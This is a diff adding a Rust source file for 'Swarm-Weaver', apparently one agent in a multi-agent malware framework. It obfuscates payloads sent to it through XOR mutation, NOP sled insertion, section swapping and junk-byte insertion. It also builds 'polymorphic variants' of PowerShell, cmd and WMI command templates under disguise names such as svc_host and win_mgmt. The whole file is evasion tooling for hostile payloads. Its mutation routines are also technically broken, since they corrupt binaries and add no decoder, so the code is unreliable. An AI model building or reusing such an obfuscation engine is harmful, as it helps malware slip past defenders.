@@ -1,0 +1,227 @@
+use hive_base::{AgentIdentity, ConsensusEngine, HiveChamber, Message, Payload, Role};
+use rand::Rng;
+use std::collections::HashMap;
+use std::time::Duration;
+use tokio::time;
+use tracing::info;
+use uuid::Uuid;
+
+struct WeaverAgent {
+    comms: HiveChamber,
+    identity: AgentIdentity,
+    consensus: ConsensusEngine,
+    mutation_cache: Vec<Vec<u8>>,
+    heartbeat_interval: Duration,
+}
+
+impl WeaverAgent {
+    async fn new() -> Self {
+        let identity = AgentIdentity::new();
+        let comms = HiveChamber::connect(&identity, Role::Weaver)
+            .await
+            .expect("Failed to connect to colmena arena");
+
+        info!("Weaver connected to shared-memory arena");
+
+        Self {
+            comms, identity,
+            consensus: ConsensusEngine::new(0.66),
+            mutation_cache: Vec::new(),
+            heartbeat_interval: Duration::from_secs(10),
+        }
+    }
+
+    fn obfuscate_payload(&mut self, input: &[u8]) -> Vec<u8> {
+        let mut rng = rand::thread_rng();
+        let technique = rng.gen_range(0..4);
+
+        let output = match technique {
+            0 => self.mutate_xor(input),
+            1 => self.mutate_nop_insertion(input),
+            2 => self.mutate_section_shuffle(input),
+            _ => self.mutate_junk_code(input),
+        };
+
+        self.mutation_cache.push(output.clone());
+        if self.mutation_cache.len() > 50 {
+            self.mutation_cache.drain(0..25);
+        }
+        output
+    }
+
+    /// Technique 1: XOR mutation with random key per byte range
+    fn mutate_xor(&self, input: &[u8]) -> Vec<u8> {
+        let mut rng = rand::thread_rng();
+        let mut output = input.to_vec();
+
+        // Skip ELF header (first 64 bytes)
+        let skip = 64.min(input.len());
+        let key = rng.gen_range(1..=255);
+        let stride = rng.gen_range(3..=11);
+
+        for i in (skip..output.len()).step_by(stride) {
+            output[i] ^= key;
+        }
+
+        // Append random padding (5-20 bytes)
+        let pad_len = rng.gen_range(5..=20);
+        output.extend((0..pad_len).map(|_| rng.gen::<u8>()));
+        output
+    }
+
+    /// Technique 2: NOP sled insertion in code sections
+    fn mutate_nop_insertion(&self, input: &[u8]) -> Vec<u8> {
+        let mut rng = rand::thread_rng();
+        let mut output = Vec::with_capacity(input.len() + 64);
+
+        // Insert NOP sleds at random positions (skip header)
+        let skip = 128.min(input.len());
+        output.extend_from_slice(&input[..skip]);
+
+        let mut i = skip;
+        while i < input.len() {
+            // 30% chance to insert a NOP sled (1-8 bytes)
+            if rng.gen_bool(0.3) && i + 8 < input.len() {
+                let nop_len = rng.gen_range(1..=8);
+                output.extend(std::iter::repeat(0x90u8).take(nop_len)); // x86 NOP
+                output.push(input[i]);
+                i += 1;
+            } else {
+                output.push(input[i]);
+                i += 1;
+            }
+        }
+
+        output
+    }
+
+    /// Technique 3: Section reordering with jump trampolines
+    fn mutate_section_shuffle(&self, input: &[u8]) -> Vec<u8> {
+        // For ELF: find section boundaries and reorder non-critical sections
+        // Simplified: swap chunks of the binary
+        let mut rng = rand::thread_rng();
+        let mut output = input.to_vec();
+
+        if input.len() > 512 {
+            let chunk_size = rng.gen_range(64..=256);
+            let a = rng.gen_range(128..input.len() - chunk_size);
+            let b = rng.gen_range(128..input.len() - chunk_size);
+
+            if a + chunk_size <= output.len() && b + chunk_size <= output.len() {
+                for k in 0..chunk_size {
+                    output.swap(a + k, b + k);
+                }
+            }
+        }
+
+        output
+    }
+
+    /// Technique 4: Junk code insertion with dead stores
+    fn mutate_junk_code(&self, input: &[u8]) -> Vec<u8> {
+        let mut rng = rand::thread_rng();
+        let mut output = Vec::with_capacity(input.len() + 32);
+
+        let skip = 128.min(input.len());
+        output.extend_from_slice(&input[..skip]);
+
+        let mut i = skip;
+        while i < input.len() {
+            output.push(input[i]);
+            i += 1;
+
+            // Insert dead code every ~50 bytes
+            if i % 50 == 0 && rng.gen_bool(0.5) {
+                let junk: Vec<u8> = (0..rng.gen_range(2..=8))
+                    .map(|_| rng.gen())
+                    .collect();
+                output.extend(junk);
+            }
+        }
+
+        output
+    }
+
+    fn generate_polymorphic_variant(&mut self, template: &str) -> String {
+        let mut rng = rand::thread_rng();
+        let names = ["svc_host", "net_util", "sys_check", "win_mgmt", "update_svc", "config_mgr"];
+        let name = names[rng.gen_range(0..names.len())];
+        let encodings = ["base64", "hex", "rot13", "xor"];
+        let encoding = encodings[rng.gen_range(0..encodings.len())];
+        format!("// Variant: {} ({})\n// Generated by Swarm-Weaver\n{}\n// [obfuscated]", name, encoding, template)
+    }
+
+    async fn publish_msg(&self, msg: Message) {
+        self.comms.publish(msg).await;
+    }
+
+    async fn send_heartbeat(&self) {
+        self.comms.send_heartbeat().await;
+    }
+
+    async fn process_incoming(&mut self) {
+        let messages = self.comms.read_new().await;
+
+        for msg in messages {
+            self.consensus.process_message(&msg);
+            match &msg.payload {
+                Payload::Request { service, payload: data } if service == "obfuscate" => {
+                    info!("Obfuscation request ({} bytes)", data.len());
+                    let result = self.obfuscate_payload(data);
+                    info!("Generated variant ({} bytes)", result.len());
+                    let resp = Message {
+                        agent_id: self.identity.id(),
+                        agent_role: Role::Weaver,
+                        timestamp: hive_base::utils::timestamp_now(),
+                        payload: Payload::Response {
+                            query_id: Uuid::new_v4(),
+                            answer: format!("obfuscated_{}bytes", result.len()),
+                            confidence: 0.95,
+                        },
+                    };
+                    self.publish_msg(resp).await;
+                }
+                Payload::Belief { asset, value, confidence } => {
+                    info!("Belief: {} = {:?} ({})", asset, value, confidence);
+                }
+                Payload::StatusEvent { event_type, subject_id, .. } if event_type == "agent_dead" => {
+                    info!("Agent {} reported DEAD by swarm", subject_id);
+                }
+                _ => {}
+            }
+        }
+    }
+
+    async fn pre_generate_mutations(&mut self) {
+        info!("Pre-generating mutation cache...");
+        for template in &["powershell -enc <base64>", "cmd /c <command>", "wmi <query>"] {
+            let v = self.generate_polymorphic_variant(template);
+            info!("Variant: {}", &v[..50.min(v.len())]);
+        }
+    }
+
+    async fn run(&mut self) {
+        info!("Swarm-Weaver starting | ID: {}", self.identity.id());
+        self.send_heartbeat().await;
+        self.pre_generate_mutations().await;
+
+        let mut heartbeat_timer = time::interval(self.heartbeat_interval);
+        let mut mutation_timer = time::interval(Duration::from_secs(120));
+
+        loop {
+            tokio::select! {
+                _ = heartbeat_timer.tick() => { self.send_heartbeat().await; }
+                _ = mutation_timer.tick() => { self.pre_generate_mutations().await; }
+                _ = time::sleep(Duration::from_millis(200)) => { self.process_incoming().await; }
+            }
+        }
+    }
+}
+
+#[tokio::main]
+async fn main() {
+    hive_base::utils::init_logging("weaver");
+    info!("Initializing Swarm-Weaver...");
+    let mut weaver = WeaverAgent::new().await;
+    weaver.run().await;
+}
